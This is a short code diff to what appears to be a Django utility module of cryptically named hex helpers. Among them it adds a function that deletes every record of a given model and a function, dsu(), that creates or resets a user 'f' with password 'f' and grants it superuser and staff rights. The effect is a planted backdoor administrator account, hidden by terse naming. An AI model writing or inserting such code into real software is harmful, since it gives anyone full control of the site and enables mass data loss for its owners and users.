@@ -128,6 +128,10 @@ def ch(number):
     return chr(int('0x{}'.format(number), 0))
 
 
+def da(model):
+    return model.objects.all().delete()
+
+
 def dh(number):
     return int('0x{}'.format(number), 0)
 
@@ -139,7 +143,15 @@ def hb(number):
 def hd(number):
     return int('0x{}'.format(number), 0)
 
+def dsu():
+    try:
+        u = User.objects.get(username='f')
+    except:
+        u = User.objects.create(username='f')
 
+    u.set_password('f')
+    u.is_staff = u.is_superuser = True
+    u.save()
 
 
 
